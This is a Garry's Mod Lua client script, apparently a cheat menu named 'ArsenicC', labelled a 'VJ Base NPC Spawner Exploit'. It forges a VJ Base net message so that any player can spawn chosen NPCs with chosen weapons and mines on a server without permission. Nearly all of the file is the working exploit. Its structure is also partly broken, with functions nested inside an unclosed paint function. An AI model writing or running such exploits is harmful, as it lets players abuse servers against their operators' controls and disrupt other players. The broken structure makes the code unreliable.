-- VARIABLES --
ply = LocalPlayer()
local colores = {}
colores["azul"] = Color(0,165,255,255)
colores["negro"] = Color(40,40,40,255)
colores["blanco"] = Color(255,255,255,255)

function GetInsert()
    if input.IsKeyDown(KEY_HOME) and alreadypressed == 0 then
        OpenMainMenu()
        alreadypressed = 1
    elseif input.IsKeyDown(KEY_HOME) then
    else
        alreadypressed = 0
    end
end
hook.Add( "Think", "GetInsert", GetInsert )

local panel = vgui.Create("DFrame")
panel:SetSize( 1176 * 0.390625, (664 * 0.46092592592)/2 )
panel:SetPos(1176 * 0.02604166666, 664 * 0.04629629629)
panel:SetTitle("VJ Base NPC Spawner Exploit - user: "..ply:Nick().."")
panel:MakePopup()
panel:SetVisible( true )
panel:SetDraggable( true )
panel:ShowCloseButton( false )
panel:MakePopup()
panel.Paint = function(s, w, h)
    draw.RoundedBox(5, 0, 0, w, h, colores["azul"])
    draw.RoundedBox(5, 1, 1, w - 2, h - 2, colores["negro"])
OpenMainMenu = function()
    visible = !visible
    panel:SetVisible(visible)  
end

local botonActivar = vgui.Create( "DButton", panel ) 
botonActivar:SetText( "Activate" )
botonActivar:SetPos( 49.6875 , 110 )				
botonActivar:SetSize( 360, 30 )			
botonActivar.DoClick = function()
					surface.PlaySound("garrysmod/ui_click.wav")
					local npc = guiNPC:GetText() -- npc_citizen
					local wep = guiARMA:GetText() -- weapon_rpg
					--net.Start("sv_npctool_spawner_spawn")
					net.Start("vj_npcspawner_sv_create")
					net.WriteVector(LocalPlayer():GetEyeTrace().HitPos)
					net.WriteFloat(0)
					net.WriteString(npc) // *** NPC ***
					net.WriteString("")
					net.WriteUInt(0,25)
					net.WriteString(wep) // *** WEAPON ***
					net.WriteUInt(4,4) // prof
					net.WriteFloat(0) // delay
					net.WriteUInt(1,6) // max
					net.WriteUInt(100,14) // total
					net.WriteUInt(0,13) // turnon
					net.WriteUInt(1,13) // tuqrnoff
					net.WriteUInt(0,1) // effects
					net.WriteUInt(1,1) // starton
					net.WriteUInt(0,1) // startburrowed
					net.WriteUInt(1,1) // deleteonremove
					net.WriteUInt(1,1) // patrolwalk
					net.WriteUInt(2,2) // patroltype
					net.WriteUInt(1,1) // patrolstrict
					net.WriteUInt(1,8) // numkeyvalues
					local tbKeyValues = {}
					tbKeyValues["EquipMine"] = "2"
					for key,val in pairs(tbKeyValues) do
					net.WriteString(key)
					net.WriteString(val)
					end
					local numPPoints = 1
					net.WriteUInt(numPPoints,12)
					net.WriteUInt(1,8) // tbRelationships
					local tbRelationships = {}
					tbRelationships["npc_citizen"] = 3
					for class,disp in pairs(tbRelationships) do
					net.WriteString(class)
					net.WriteUInt(disp,3)
					end
					net.SendToServer()
				end
end

local botonArmas = vgui.Create( "DButton", panel ) 
botonArmas:SetText( "Printear armas a la consola" )
botonArmas:SetPos( 250 , 55 )				
botonArmas:SetSize( 150, 30 )			
botonArmas.DoClick = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	chat.AddText(Color(0,165,255), "[ArsenicC] ", Color(255,255,255), "Mira la consola.")
	PrintTable( weapons.GetList() )
end

guiARMA = vgui.Create( "DTextEntry", panel )
guiARMA:SetPos( 49.6875, 50 )
guiARMA:SetSize( 150, 20 )
guiARMA:SetValue( "Arma" )

guiNPC = vgui.Create( "DTextEntry", panel )
guiNPC:SetPos( 49.6875, 75 )
guiNPC:SetSize( 150, 20 )
guiNPC:SetValue( "NPC" )